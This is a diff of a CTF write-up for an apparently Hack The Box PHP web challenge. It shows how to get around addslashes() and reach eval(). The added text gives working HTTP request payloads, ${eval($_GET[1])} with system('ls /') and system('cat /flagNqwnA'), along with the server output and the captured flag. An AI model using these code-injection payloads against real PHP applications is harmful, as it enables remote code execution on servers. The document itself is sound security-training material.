@@ -69,11 +69,52 @@ Returns a string with backslashes added before characters that need to be escape
 - backslash (\)
 - NUL (the NUL byte)
 
-## Attack
+## bypass addslashes() + eval()
 
-`{${$flag=file_get_contents('/flag')}}`
+because just only the `format` parameter go through `addslashes()` method, we can use another parameter to bypass this.
 
+```http
+GET /?format=${eval($_GET[1])}&1=phpinfo()%3b HTTP/1.1
+```
+
+=> phpinfo() page is returned
+
+## get flag
+
+solution 1: i tried oob interaction but failed both with burp suite collaborator and pipedream, maybe it's blocked.
+
+solution 2: directly echo
+
+- find flag file name:
+
+  ```http
+  GET /?format=${eval($_GET[1])}&1=echo+system('ls+/')%3b HTTP/1.1
+
+  HTTP/1.1 200 OK
+
+  bin
+  boot
+  dev
+  entrypoint.sh
+  etc
+  flagNqwnA
+  home
+  ...
+  ```
+
+- get the flag:
+
+  ```http
+  GET /?format=${eval($_GET[1])}&1=echo+system('cat+/flagNqwnA')%3b HTTP/1.1
+
+  HTTP/1.1 200 OK
+
+  HTB{wh3n_l0v3_g3ts_eval3d_sh3lls_st4rt_p0pp1ng}
+  ```
 
 ## References
 
-https://www.programmersought.com/article/30723400042/
+bypass addslashes():
+
+- <https://www.programmersought.com/article/30723400042/>
+- <https://0xalwayslucky.gitbook.io/cybersecstack/web-application-security/php>
